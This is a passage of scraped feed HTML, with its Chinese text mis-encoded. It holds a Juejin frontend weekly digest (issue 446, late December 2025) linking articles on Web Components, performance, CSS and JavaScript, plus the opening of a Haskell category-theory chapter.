content="â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-30T02:43:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘å®‰ä¸œå°¼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘å®‰ä¸œå°¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:40.000Z" title="Tue Dec 30 2025 02:43:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ğŸ“¢ <strong>å®£è¨€</strong>ï¼š<strong>æ¯å‘¨æ›´æ–°å›½å¤–è®ºå›çš„å‰ç«¯çƒ­é—¨æ–‡ç« ï¼Œæ¨èå¤§å®¶é˜…è¯»/ç¿»è¯‘ï¼Œç´§è·Ÿæ—¶äº‹ï¼ŒæŒæ¡å‰ç«¯æŠ€æœ¯åŠ¨æ€ï¼Œä¹Ÿä¸ºå†™ä½œæˆ–çªç ´æ–°é¢†åŸŸæä¾›çµæ„Ÿ~</strong></p>
<p>æ¬¢è¿å¤§å®¶è®¿é—®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">github.com/TUARAN/fronâ€¦</a>
é¡ºæ‰‹ç‚¹ä¸ª â­ star æ”¯æŒï¼Œæ˜¯æˆ‘ä»¬æŒç»­è¾“å‡ºçš„ç»­èˆªç”µæ± ğŸ”‹âœ¨ï¼</p>
<p>åœ¨çº¿ç½‘å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffwdc.pages.dev%2F" target="_blank" title="https://fwdc.pages.dev/" ref="nofollow noopener noreferrer">fwdc.pages.dev/</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bc20a8cbd3547d18f03a38aa7d01bec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667420&amp;x-signature=RfLnzf3LoWSRLODlksBnHhyW%2FVU%3D" alt="å‰ç«¯å‘¨åˆŠå°é¢" loading="lazy"/></p>
<hr/>
<p>ğŸ’¬ <strong>æ¨èè¯­</strong></p>
<p>å›é¡¾ 2025 å¹´ï¼Œå‰ç«¯åœˆä»æ ‡å‡†æ¼”è¿›ã€ç»„ä»¶åŒ–å¤å…´åˆ°æ€§èƒ½æŒ‡æ ‡æ‹†è§£éƒ½æœ‰å€¼å¾—å¤ç›˜çš„æ•…äº‹ã€‚æœ¬æœŸèšç„¦å¹´åº¦åå¤§å‰ç«¯å™äº‹ã€Web Components çš„åå¼¹åŠ¿å¤´ã€AV1 ç¼–è§£ç å™¨æ–©è·è‰¾ç¾å¥–èƒŒåçš„è¡Œä¸šæ¨åŠ¨åŠ›ï¼Œä»¥åŠç”¨ç°ä»£æŠ€æœ¯é‡ç° 8-bit å¤å¤ä¸–ç•Œçš„åˆ›æ„å®è·µã€‚æ€§èƒ½ç¯‡æ•´ç†äº†å­—ä½“æ‡’åŠ è½½ã€TTFB æŒ‡æ ‡è¯¯åŒºã€URL å‚æ•°ä¼˜åŒ–ä¸ DevTools è°ƒè¯•æŠ€å·§ï¼›CSS éƒ¨åˆ†å¸¦æ¥ç²˜æ€§å®šä½çš„æ»šåŠ¨åˆ‡æ¢ã€<code>text-decoration-inset</code> çš„æ’ç‰ˆæ–°æ€è·¯ä¸å®¹å™¨æŸ¥è¯¢çš„ 2026 å±•æœ›ï¼›JavaScript æ ç›®åˆ™æ¶µç›– Vue ç”Ÿæ€çš„è§’è‰²ç”»åƒã€å¹´åº¦è¶‹åŠ¿å›é¡¾ã€Zustand å…¥é—¨ä¸çº¯ HTML æ›¿ä»£ JS çš„æç®€æ¡ˆä¾‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">ğŸ—‚ æœ¬æœŸç²¾é€‰ç›®å½•</h2>
<h3 data-id="heading-1">ğŸ§­ Web å¼€å‘</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Ffrontend-wrapped-2025%2F" target="_blank" title="https://blog.logrocket.com/frontend-wrapped-2025/" ref="nofollow noopener noreferrer">Frontend Wrapped 2025: The 10 storylines that defined the year</a>ï¼šç›˜ç‚¹ 2025 å¹´å¡‘é€ å‰ç«¯è¡Œä¸šçš„åå¤§äº‹ä»¶ï¼Œä» RSC è½åœ°åˆ° AI é©±åŠ¨å¼€å‘çš„æ½®æ¶Œï¼Œä¸ºå›¢é˜Ÿå¹´åº¦å¤ç›˜æä¾›å‚è€ƒåæ ‡ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fweb-components-are-the-comeback-nobody-saw-coming%2F" target="_blank" title="https://thenewstack.io/web-components-are-the-comeback-nobody-saw-coming/" ref="nofollow noopener noreferrer">Web Components Are the Comeback Nobody Saw Coming</a>ï¼šè§‚å¯Ÿ Web Components å¦‚ä½•å‡­å€Ÿè·¨æ¡†æ¶äº’æ“ä½œå’Œå¹³å°çº§æ”¯æŒé‡æ–°ç«™ä¸Šèˆå°ä¸­å¤®ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.mozilla.org%2Fen%2Fmozilla%2Fav1-video-codec-wins-emmy%2F" target="_blank" title="https://blog.mozilla.org/en/mozilla/av1-video-codec-wins-emmy/" ref="nofollow noopener noreferrer">When a video codec wins an Emmy</a>ï¼šMozilla åˆ†äº« AV1 è§†é¢‘ç¼–è§£ç å™¨æ‹¿ä¸‹å·¥ç¨‹ç±»è‰¾ç¾å¥–çš„å†ç¨‹ï¼Œå±•ç¤ºå¼€æ”¾æ ‡å‡†æ¨åŠ¨åª’ä½“ä½“éªŒçš„ä»·å€¼ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2F2025%2F12%2F23%2Fbuilding-a-nostalgic-8-bit-universe-with-modern-tech-a-vibe-coding-journey%2F" target="_blank" title="https://tympanus.net/codrops/2025/12/23/building-a-nostalgic-8-bit-universe-with-modern-tech-a-vibe-coding-journey/" ref="nofollow noopener noreferrer">Building a Nostalgic 8-bit Universe with Modern Tech: A Vibe Coding Journey</a>ï¼šåˆ©ç”¨ Three.jsã€GSAP ä¸ç°ä»£æ¸²æŸ“ç®¡çº¿å¤åˆ» 8-bit æ—¶ä»£çš„æ‹Ÿç‰©äº¤äº’ï¼Œè¯¦è§£çµæ„Ÿåˆ°ä¸Šçº¿çš„åˆ›ä½œæµç¨‹ã€‚</li>
</ul>
<h4 data-id="heading-2">âš¡ æ€§èƒ½</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhighperformancewebfonts.com%2Fread%2Flazy-loading-optional-fonts" target="_blank" title="https://highperformancewebfonts.com/read/lazy-loading-optional-fonts" ref="nofollow noopener noreferrer">Lazy-Loading Optional Fonts with Native Browser API</a>ï¼šé€šè¿‡ CSS Font Loading API æŒ‰éœ€æ‡’åŠ è½½å¯é€‰å­—ä½“ï¼Œå…¼é¡¾å“ç‰Œä½“éªŒä¸é¦–å±æ€§èƒ½ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Fchrome-devtools-for-debugging-web-performance%2F" target="_blank" title="https://calendar.perfplanet.com/2025/chrome-devtools-for-debugging-web-performance/" ref="nofollow noopener noreferrer">Chrome DevTools for Debugging Web Performance</a>ï¼šæ·±æŒ– DevTools ä¸­çš„æ€§èƒ½é¢æ¿ã€ç½‘ç»œè®°å½•ä¸å‹æµ‹å·¥å…·ï¼Œæ„å»ºç³»ç»ŸåŒ–çš„æ’æŸ¥æµç¨‹ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Fttfb-doesnt-mean-what-you-think-it-means%2F" target="_blank" title="https://calendar.perfplanet.com/2025/ttfb-doesnt-mean-what-you-think-it-means/" ref="nofollow noopener noreferrer">TTFB doesnâ€™t mean what you think it means</a>ï¼šæ‹†è§£ TTFB æŒ‡æ ‡çš„çœŸæ­£å«ä¹‰åŠå…¶ä¸ç¼“å­˜ã€è¾¹ç¼˜è®¡ç®—çš„å…³ç³»ï¼Œé¿å…è¢«â€œä½é¦–å­—èŠ‚â€è¿·æƒ‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Ffixing-the-url-params-performance-penalty%2F" target="_blank" title="https://calendar.perfplanet.com/2025/fixing-the-url-params-performance-penalty/" ref="nofollow noopener noreferrer">Fixing the URL params performance penalty</a>ï¼šåˆ†æ URL æŸ¥è¯¢å‚æ•°ä¸ºä½•æ‹–æ…¢ç¼“å­˜å‘½ä¸­ï¼Œå¹¶æä¾› CDN ä¸æµè§ˆå™¨ä¸¤ä¾§çš„ç¼“è§£ç­–ç•¥ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Fserver-components-vs-islands-architecture%2F" target="_blank" title="https://blog.logrocket.com/server-components-vs-islands-architecture/" ref="nofollow noopener noreferrer">Server Components vs. Islands Architecture: The performance showdown</a>ï¼šä»äº¤äº’å»¶è¿Ÿã€æµå¼æ¸²æŸ“ä¸ç¼“å­˜å‹å¥½åº¦æ¯”è¾ƒ RSC ä¸ Islands æ¶æ„çš„æ€§èƒ½å–èˆã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Ftips-for-making-the-performance-panel-less-overwhelming%2F" target="_blank" title="https://calendar.perfplanet.com/2025/tips-for-making-the-performance-panel-less-overwhelming/" ref="nofollow noopener noreferrer">Tips for making the Performance Panel less overwhelming</a>ï¼šåˆ†äº«ä½¿ç”¨ Performance é¢æ¿æ—¶çš„æ—¶é—´çº¿åˆ†å±‚ã€æ ‡è®°ä¸æ¨¡æ¿æŠ€å·§ï¼Œé™ä½ä¸Šæ‰‹å¤æ‚åº¦ã€‚</li>
</ul>
<h3 data-id="heading-3">ğŸ¨ CSS</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendmasters.com%2Fblog%2Ftoggle-position-sticky-to-position-fixed-on-scroll%2F" target="_blank" title="https://frontendmasters.com/blog/toggle-position-sticky-to-position-fixed-on-scroll/" ref="nofollow noopener noreferrer">Toggle <code>position: sticky</code> to <code>position: fixed</code> on Scroll</a>ï¼šåˆ©ç”¨è‡ªå®šä¹‰å±æ€§ä¸ IntersectionObserver åœ¨æ»šåŠ¨ä¸­ä¼˜é›…åˆ‡æ¢ sticky/fixedï¼Œå®ç°å¤´éƒ¨æ çš„å¹³æ»‘å¸é™„ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcss-tricks.com%2Ftext-decoration-inset-is-like-padding-for-text-decorations%2F" target="_blank" title="https://css-tricks.com/text-decoration-inset-is-like-padding-for-text-decorations/" ref="nofollow noopener noreferrer">text-decoration-inset is Like Padding for Text Decorations</a>ï¼šä»‹ç» <code>text-decoration-inset</code> å¦‚ä½•ä¸ºæ–‡å­—è£…é¥°æä¾›â€œå†…è¾¹è·â€ï¼Œæå‡ä¸‹åˆ’çº¿æ’ç‰ˆæ§åˆ¶åŠ›ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Fcontainer-queries-2026%2F" target="_blank" title="https://blog.logrocket.com/container-queries-2026/" ref="nofollow noopener noreferrer">Container queries in 2026: Powerful, but not a silver bullet</a>ï¼šæ€»ç»“å®¹å™¨æŸ¥è¯¢çš„æ–°èƒ½åŠ›ä¸å½“å‰é™åˆ¶ï¼Œç»™å‡º 2026 å¹´çš„ç»„ä»¶è®¾è®¡å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-4">ğŸ’¡ JavaScript</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwtrclred.io%2Fen%2Fposts%2F07" target="_blank" title="https://wtrclred.io/en/posts/07" ref="nofollow noopener noreferrer">Characterize Vue.js</a>ï¼šä»¥äººç‰©è®¾å®šè®²è¿° Vue ç”Ÿæ€çš„æŠ€æœ¯æ€§æ ¼å’Œç¤¾åŒºä»·å€¼è§‚ï¼Œé‡æ–°è®¤è¯†æ¡†æ¶èƒŒåçš„è®¾è®¡å–å‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Ftrends-that-defined-javascript-in-2025%2F" target="_blank" title="https://thenewstack.io/trends-that-defined-javascript-in-2025/" ref="nofollow noopener noreferrer">Trends That Defined JavaScript in 2025</a>ï¼šå¹´åº¦ JS è¶‹åŠ¿å›é¡¾ï¼šç”Ÿæ€æ•´åˆã€ç±»å‹ç³»ç»Ÿå¼ºåŒ–ã€å¹³å° API æ™®åŠç­‰å…³é”®åŠ¨å‘ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.telerik.com%2Fblogs%2Fintroduction-zustand" target="_blank" title="https://www.telerik.com/blogs/introduction-zustand" ref="nofollow noopener noreferrer">An Introduction to Zustand</a>ï¼šZustand çŠ¶æ€ç®¡ç†å…¥é—¨ï¼Œæ¶µç›–åŸºç¡€æ¦‚å¿µã€ç®€æ´ API ä¸ React å®æˆ˜ç¤ºä¾‹ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.htmhell.dev%2Fadventcalendar%2F2025%2F27%2F" target="_blank" title="https://www.htmhell.dev/adventcalendar/2025/27/" ref="nofollow noopener noreferrer">Replacing JS with just HTML</a>ï¼šé€šè¿‡åŸç”Ÿ HTML å…ƒç´ å’Œæ¸è¿›å¢å¼ºæ€è·¯ï¼Œå±•ç¤ºå¦‚ä½•åœ¨ä¸å†™ JS çš„æƒ…å†µä¸‹å®ç°äº¤äº’éœ€æ±‚ã€‚</li>
</ul>
<p>âœ… OKï¼Œä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡åˆ†äº«ï¼Œæ¬¢è¿åŠ æˆ‘ä»¬å¨ atar24ï¼Œå¤‡æ³¨ã€Œå‰ç«¯å‘¨åˆŠã€ï¼Œæˆ‘ä»¬ä¼šé‚€è¯·ä½ è¿›äº¤æµç¾¤ğŸ‘‡</p>
<p>ğŸš€ æ¯å‘¨åˆ†äº«æŠ€æœ¯å¹²è´§
ğŸ ä¸å®šæœŸæŠ½å¥–ç¦åˆ©
ğŸ’¬ æœ‰é—®å¿…ç­”ï¼Œç¾¤å‹äº’åŠ©</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹]]></title>    <link>https://juejin.cn/post/7589181008099000335</link>    <guid>https://juejin.cn/post/7589181008099000335</guid>    <pubDate>2025-12-30T02:47:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008099000335" data-draft-id="7589207843787784227" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:47:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬åç« ï¼šèŒƒç•´ä¹‹å·…ä¸é€»è¾‘çš„ç»ˆç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:47:30.000Z" title="Tue Dec 30 2025 02:47:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ èƒ½æ¥åˆ°è¿™é‡Œï¼Œè¯´æ˜ä½ å·²å†ç»ä¹é‡å¤©åŠ«ï¼Œç¥è¯†å·²èƒ½ç©¿é€è¡¨è±¡çš„ä¸šåŠ¡é€»è¾‘ï¼Œç›´æŠµå®‡å®™çš„æœ¬æºè§„å¾‹ã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬å°†è¿ˆå…¥<strong>ç»ˆç« ï¼šæ¸¡åŠ«å‡ä»™ä¸ä¸‡æ³•å½’ä¸€ï¼ˆCategory Theory &amp; The Tao of Codeï¼‰</strong> ã€‚åœ¨è¿™ä¸€å¢ƒç•Œï¼Œä»£ç ä¸å†æ˜¯å­—ç¬¦ï¼Œç±»å‹ä¸å†æ˜¯çº¦æŸï¼Œå®ƒä»¬åŒ–ä½œäº†æ•°å­¦çš„çº¯ç²¹ç¾æ„Ÿã€‚</p>
<hr/>
